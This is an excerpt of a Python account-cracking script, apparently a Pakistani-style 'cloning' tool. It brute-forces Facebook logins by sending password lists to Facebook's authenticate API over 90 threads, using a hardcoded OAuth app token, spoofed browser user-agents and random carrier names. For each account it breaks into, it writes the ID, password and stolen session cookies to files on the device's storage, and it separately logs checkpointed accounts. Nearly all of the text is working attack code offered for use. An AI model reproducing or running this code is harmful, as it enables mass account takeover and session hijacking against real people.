...
def gmail():
		...
		with tred(max_workers=90) as HS:
			total = str(len(fo))
			clear()
		...
		try:
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [HS-CP] '+ids+' | '+pas+'\033[1;91m')
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        network = random.choice(['Zong','null','Marshmallow','Telekom China','ufone'])
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/HS-CO0KIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
"Accept": "*/*",
"Connection": "keep-alive",
"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5762.210 Safari/537.36 OPR/98.0.4613.171",
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "unknown",
"Content-Type": "application/x-www-form-urlencoded",
...
"Content-Length": "329",}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [HS-OK] '+ids+' | '+pas+'\033[1;96m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]) 
                                        #print("Cookie: "+coki)
                                        open('/sdcard/HS-CO0KIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        open('/sdcard/HS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [HS-CP] '+ids+' | '+pas+'\033[1;91m')
                                                open('/sdcard/HS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        headers={
                                ...
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5796.207 Safari/537.36 OPR/98.0.4470.77',
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [HS-CP] '+ids+' | '+pas+'\033[1;91m')
                                                open('/sdcard/HS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
